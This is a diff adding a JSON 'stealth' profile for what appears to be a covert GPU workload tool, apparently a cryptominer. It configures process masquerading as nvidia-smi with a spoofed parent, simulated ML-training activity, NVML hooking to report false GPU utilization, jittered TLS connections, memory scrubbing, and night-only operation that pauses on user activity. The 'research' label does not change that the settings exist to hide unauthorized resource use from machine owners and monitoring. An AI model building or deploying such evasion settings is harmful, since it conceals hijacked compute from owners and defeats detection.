@@ -1,0 +1,83 @@
+{
+  "profile_name": "stealth",
+  "description": "Maximum stealth configuration - designed for high-security research environments",
+  "risk_level": "high_detection_evasion",
+
+  "process_masquerading": {
+    "enabled": true,
+    "process_name": "nvidia-smi",
+    "cmdline_args": ["--query-gpu=utilization.gpu", "--loop=1"],
+    "parent_process_spoofing": true,
+    "target_parent": "systemd"
+  },
+
+  "workload_simulation": {
+    "enabled": true,
+    "pattern": "ml_training",
+    "fake_framework": "tensorflow",
+    "memory_access_pattern": "sequential_with_random_bursts",
+    "cpu_usage_simulation": {
+      "enabled": true,
+      "target_usage_percent": 15,
+      "fluctuation_range": 5
+    }
+  },
+
+  "metrics_obfuscation": {
+    "enabled": true,
+    "nvml_hooking": true,
+    "reported_utilization": {
+      "gpu_compute": 45,
+      "memory_usage": 60,
+      "temperature": 68,
+      "power_draw_watts": 180
+    },
+    "add_random_variance": true,
+    "variance_percent": 3
+  },
+
+  "network_evasion": {
+    "enabled": true,
+    "use_tls": true,
+    "tls_version": "1.3",
+    "randomize_timing": true,
+    "jitter_ms": {
+      "min": 100,
+      "max": 500
+    },
+    "connection_frequency": {
+      "submit_interval_seconds": 30,
+      "heartbeat_interval_seconds": 120
+    },
+    "dns_over_https": false
+  },
+
+  "anti_forensics": {
+    "enabled": true,
+    "memory_scrubbing": true,
+    "log_deletion": false,
+    "timestamp_manipulation": false,
+    "clear_bash_history": false
+  },
+
+  "resource_limiting": {
+    "enabled": true,
+    "max_gpu_utilization_percent": 70,
+    "max_memory_usage_mb": 6144,
+    "max_power_watts": 200,
+    "thermal_throttle_celsius": 75,
+    "adaptive_throttling": true
+  },
+
+  "operational_schedule": {
+    "enabled": true,
+    "time_based_operation": true,
+    "active_hours": {
+      "start_hour": 22,
+      "end_hour": 6,
+      "timezone": "UTC"
+    },
+    "pause_on_user_activity": true,
+    "resume_delay_seconds": 300
+  }
+}
